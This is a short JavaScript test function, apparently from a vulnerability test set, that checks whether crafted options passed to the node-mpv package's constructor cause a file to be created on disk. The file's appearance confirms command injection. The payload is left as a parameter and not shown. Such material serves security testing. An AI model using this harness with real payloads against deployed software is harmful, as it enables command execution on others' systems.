function exploitFunction(payload) {
    const Root = require("node-mpv");
    const fs = require("fs");
    const path = "./node-mpv";

    try {
        if (fs.existsSync(path)) {
            fs.unlinkSync(path);
            console.log("File removed:", path);
        }
    } catch (err) {
        console.error(err);
    }

    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(false);

    var options = payload;
    try {
        var root = new Root(options);
    } catch (error) {}

    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function (err) {});
}

module.exports = { exploitFunction };